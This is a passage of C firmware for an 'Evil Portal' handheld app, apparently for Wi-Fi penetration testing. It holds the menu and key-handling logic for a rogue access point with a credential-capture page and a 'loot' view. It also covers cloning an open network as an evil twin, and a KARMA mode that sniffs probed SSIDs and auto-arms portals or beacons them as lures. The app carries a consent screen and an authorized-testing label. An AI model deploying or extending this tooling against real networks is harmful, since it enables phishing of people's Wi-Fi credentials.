    if (s_state == ST_CONSENT || s_state == ST_SCAN || s_state == ST_KARMA_SCAN ||
        s_state == ST_CLONE || s_state == ST_STOPPING) return;
    s_menu = !s_menu; s_menu_sel = 0; set_hint(); nucleo_app_request_draw();
}
static void menu_choose(void)
{
    const char *it = menu_item(s_menu_sel);
    s_menu = false;
    if (!strcmp(it, "Loot catture"))       { s_ret = s_state; go(ST_LOOT); }
    else if (!strcmp(it, "Ferma portale")) { s_stop_armed = false; go(ST_STOPPING); }
    else if (!strcmp(it, "Guida"))         { s_ret = s_state; go(ST_GUIDE); }
    else { set_hint(); nucleo_app_request_draw(); }
}
static bool ep_back(int key)
{
    (void)key;
    if (s_menu) { s_menu = false; set_hint(); nucleo_app_request_draw(); return true; }
    switch (s_state) {
        case ST_SSID: case ST_PAGE: go(ST_SETUP); return true;
        case ST_TYPE: go(ST_SSID); return true;
        case ST_SETUP: case ST_TARGETS: case ST_KARMA: go(ST_HOME); return true;
        case ST_LURE: nucleo_wifiatk_beacon_stop(); go(ST_HOME); return true;
        case ST_LOOT: case ST_GUIDE: go(s_ret ? s_ret : ST_HOME); return true;
        default: return false;   // HOME / RUNNING / consent / busy -> let the framework close the app
    }
}

// ---- key handling ------------------------------------------------------------
static void list_nav(int *sel, int n, int key)
{
    if (n <= 0) return;
    if (key == NK_UP)   *sel = (*sel + n - 1) % n;
    if (key == NK_DOWN) *sel = (*sel + 1) % n;
}

static void on_key(int key, char ch)
{
    if (s_menu) {
        int n = menu_count();
        if (key == NK_UP || key == NK_DOWN) { list_nav(&s_menu_sel, n, key); nucleo_app_request_draw(); }
        else if (key == NK_ENTER) menu_choose();
        return;
    }
    switch (s_state) {
        case ST_CONSENT:
            if (key == NK_ENTER) { s_consented = true; go(ST_HOME); }
            return;
        case ST_HOME:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_home_sel, 4, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER) {
                if (s_home_sel == 0)      { s_mode = 0; build_rows(); go(ST_SETUP); }
                else if (s_home_sel == 1) { s_mode = 1; if (s_ap_n == 0) { s_scan_armed = false; go(ST_SCAN); } else go(ST_TARGETS); }
                else if (s_home_sel == 2) { s_karma_armed = false; s_karma_started = false; go(ST_KARMA_SCAN); }
                else                      { s_ret = ST_HOME; go(ST_LOOT); }
            }
            return;
        case ST_TARGETS:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_ap_idx, s_ap_n, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER && s_ap_n > 0) { twin_autopick_template(); build_rows(); go(ST_SETUP); }
            else if (ch == 'r' || ch == 'R') { s_scan_armed = false; go(ST_SCAN); }
            return;
        case ST_KARMA: {
            int kn = nucleo_wifiatk_karma_count();
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_km_sel, kn, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER && kn > 0) {            // adopt ONE as the Civetta lure -> configure
                snprintf(s_custom, sizeof s_custom, "%s", nucleo_wifiatk_karma_ssid(s_km_sel));
                s_mode = 0; build_rows();
                snprintf(s_err, sizeof s_err, "Karma: %.20s", s_custom);
                go(ST_SETUP);
            } else if ((ch == 'a' || ch == 'A') && kn > 0) { // AUTO-ARM: capture portal on this wanted SSID NOW
                snprintf(s_custom, sizeof s_custom, "%s", nucleo_wifiatk_karma_ssid(s_km_sel));
                s_mode = 0; build_rows();
                start_portal();                              // straight to RUNNING (closes sniff->capture)
            } else if ((ch == 'b' || ch == 'B') && kn > 0) { // AUTO-LURE: beacon ALL the wanted SSIDs
                nucleo_wifiatk_beacon_custom_clear();
                for (int i = 0; i < kn; i++) nucleo_wifiatk_beacon_custom_add(nucleo_wifiatk_karma_ssid(i));
                if (nucleo_wifiatk_beacon_start(3 /*CUSTOM*/) == 0) go(ST_LURE);
                else { snprintf(s_err, sizeof s_err, "Beacon non avviato"); nucleo_app_request_draw(); }
            } else if (ch == 'r' || ch == 'R') { s_karma_armed = false; s_karma_started = false; go(ST_KARMA_SCAN); }
            return;
        }
        case ST_SSID:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, s_ssid_n + 1, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER) {
                if (s_sel == 0) { s_typelen = strlen(s_custom); go(ST_TYPE); }
                else { s_ssid_idx = s_sel - 1; s_custom[0] = 0; go(ST_SETUP); }
            }
            return;
        case ST_TYPE:
            if (key == NK_ENTER) { go(ST_SETUP); }
            else if (key == NK_DEL) { if (s_typelen > 0) s_custom[--s_typelen] = 0; nucleo_app_request_draw(); }
            else if (ch >= 32 && ch < 127 && s_typelen < 32) { s_custom[s_typelen++] = ch; s_custom[s_typelen] = 0; nucleo_app_request_draw(); }
            return;
        case ST_PAGE:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, s_tpl_n, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER) { s_tpl_idx = s_sel; go(ST_SETUP); }
            return;
        case ST_SETUP:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, s_nrows, key); nucleo_app_request_draw(); }
            else if (key == NK_ENTER) {
                switch (s_rows[s_sel]) {
                    case R_SSID:  s_sel = 0; go(ST_SSID); break;
                    case R_NET:   go(ST_TARGETS); break;
                    case R_SEC:   s_mode = (s_mode == 1) ? 2 : 1; set_hint(); nucleo_app_request_draw(); break;
                    case R_PAGE:  s_sel = s_tpl_idx; go(ST_PAGE); break;
                    case R_CLONE:
                        if (s_ap_n <= 0)        snprintf(s_err, sizeof s_err, "Scegli prima una rete");
                        else if (twin_encrypted()) snprintf(s_err, sizeof s_err, "Rete non aperta: no portale");
                        else { s_clone_armed = false; go(ST_CLONE); break; }
                        nucleo_app_request_draw(); break;
                    case R_GO:    start_portal(); break;
                }
            }
            return;
        case ST_RUNNING:
            if (key == NK_ENTER) { s_stop_armed = false; go(ST_STOPPING); }
            return;
        case ST_LURE:
            if (key == NK_ENTER) { nucleo_wifiatk_beacon_stop(); go(ST_KARMA); }
            return;
        case ST_LOOT:
            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, nucleo_evilportal_recent_count(), key); nucleo_app_request_draw(); }
            return;
        default: return;   // busy screens ignore keys
    }
}

static void leave(void) { }   // portal keeps running in the background; launcher shows the red alert

extern "C" void nucleo_register_evilportal(void)
{
    static const nucleo_app_def_t app = {
        "evilportal", "Evil Portal", "Security", "Captive portal for authorized Wi-Fi testing",
        'E', EP_RED, enter, on_key, tick, draw, leave,
        // SOLO BOOT: reboot into a FRESH, unfragmented heap. This is the heaviest Security app —
        // template in RAM + rogue AP + captive DNS + its own :80 server + live page-clone + KARMA
        // promiscuous sniff — and on the live, fragmented OS heap (esp. the ADV) those allocations are
        // marginal (boot Task-WDT, KARMA reboot). A clean boot makes it solid, like the games/beacon.
        // Trade-off: leaving the app reboots to the OS, so the portal no longer runs in the background.
        NX_SOLO
    };
    nucleo_app_register(&app);
}
